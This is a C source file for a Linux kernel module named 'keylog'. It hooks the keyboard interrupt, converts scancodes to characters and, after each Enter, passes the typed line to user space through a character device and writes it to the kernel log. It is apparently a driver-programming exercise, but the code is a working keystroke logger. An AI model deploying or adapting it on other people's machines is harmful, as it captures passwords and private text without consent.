#include <linux/module.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/device.h>
#include <linux/wait.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/workqueue.h>
#include <linux/string.h>

#define DEVICE_NAME "keylog"
#define CLASS_NAME  "irqstringcls"
#define KEYBOARD_IRQ 1
#define MAX_STRING_LEN 128

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Harsha Kadali");
MODULE_DESCRIPTION("IRQ to user with string buffer and workqueue delay");
MODULE_VERSION("1.1");

static int major;
static struct class *irq_class;
static struct device *irq_device;

static DECLARE_WAIT_QUEUE_HEAD(wq);
static int data_ready = 0;

static char irq_string[MAX_STRING_LEN];
static int buf_pos = 0;

// Workqueue setup
static struct work_struct string_work;

// Partial scan code to ASCII map
static const char scan_to_ascii[128] = {
    [0x02] = '1', [0x03] = '2', [0x04] = '3', [0x05] = '4',
    [0x06] = '5', [0x07] = '6', [0x08] = '7', [0x09] = '8',
    [0x0A] = '9', [0x0B] = '0',
    [0x10] = 'q', [0x11] = 'w', [0x12] = 'e', [0x13] = 'r',
    [0x14] = 't', [0x15] = 'y', [0x16] = 'u', [0x17] = 'i',
    [0x18] = 'o', [0x19] = 'p',
    [0x1E] = 'a', [0x1F] = 's', [0x20] = 'd', [0x21] = 'f',
    [0x22] = 'g', [0x23] = 'h', [0x24] = 'j', [0x25] = 'k',
    [0x26] = 'l',
    [0x2C] = 'z', [0x2D] = 'x', [0x2E] = 'c', [0x2F] = 'v',
    [0x30] = 'b', [0x31] = 'n', [0x32] = 'm',
    [0x39] = ' ', [0x1C] = '\n' // Enter key
};

// Workqueue function
static void string_work_func(struct work_struct *work)
{
    msleep(1000);  // Delay 1 second
    irq_string[buf_pos] = '\0';
    data_ready = 1;
    wake_up_interruptible(&wq);
    pr_info("irqstring: string '%s' ready after delay\n", irq_string);
    buf_pos = 0;
}

// IRQ handler
static irqreturn_t irq_handler(int irq, void *dev_id)
{
    unsigned char sc = inb(0x60);

    if (!(sc & 0x80)) {
        char c = scan_to_ascii[sc];
        if (c && buf_pos < MAX_STRING_LEN - 1) {
            if (c == '\n') {
                schedule_work(&string_work);
            } else {
                irq_string[buf_pos++] = c;
            }
        }
    }

    return IRQ_HANDLED;
}

// Read handler
static ssize_t irq_read(struct file *file, char __user *buf, size_t len, loff_t *offset)
{
    if (wait_event_interruptible(wq, data_ready))
        return -ERESTARTSYS;

    data_ready = 0;
    size_t str_len = strlen(irq_string);
    if (copy_to_user(buf, irq_string, str_len))
        return -EFAULT;

    return str_len;
}

static struct file_operations fops = {
    .owner = THIS_MODULE,
    .read  = irq_read,
};

static int __init irqstring_init(void)
{
    INIT_WORK(&string_work, string_work_func);

    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0)
        return major;

    irq_class = class_create(CLASS_NAME);
    irq_device = device_create(irq_class, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);

    if (request_irq(KEYBOARD_IRQ, irq_handler, IRQF_SHARED, DEVICE_NAME, (void *)irq_handler)) {
        device_destroy(irq_class, MKDEV(major, 0));
        class_destroy(irq_class);
        unregister_chrdev(major, DEVICE_NAME);
        return -EIO;
    }

    pr_info("irqstring: module loaded, major=%d\n", major);
    return 0;
}

static void __exit irqstring_exit(void)
{
    cancel_work_sync(&string_work);
    free_irq(KEYBOARD_IRQ, (void *)irq_handler);
    device_destroy(irq_class, MKDEV(major, 0));
    class_destroy(irq_class);
    unregister_chrdev(major, DEVICE_NAME);
    pr_info("irqstring: module unloaded\n");
}

module_init(irqstring_init);
module_exit(irqstring_exit);

